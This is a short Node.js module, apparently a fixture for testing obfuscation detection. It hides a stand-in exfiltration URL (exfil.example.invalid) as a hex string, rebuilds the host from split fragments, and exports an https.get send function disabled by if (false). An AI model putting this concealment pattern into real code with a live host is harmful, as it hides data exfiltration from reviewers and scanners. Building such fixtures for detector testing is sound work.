'use strict';
const https = require('https');
// 'https://exfil.example.invalid/x' hex-encoded
const HEX = '68747470733a2f2f657866696c2e6578616d706c652e696e76616c69642f78';
function decode(h) {
  let s = '';
  for (let i = 0; i < h.length; i += 2) s += String.fromCharCode(parseInt(h.substr(i, 2), 16));
  return s;
}
const parts = ['exfil.', 'example.', 'inv' + 'alid'];
const host = parts.join('');
const url = decode(HEX);
exports._send = function() { if (false) https.get(url); };
exports._host = host;
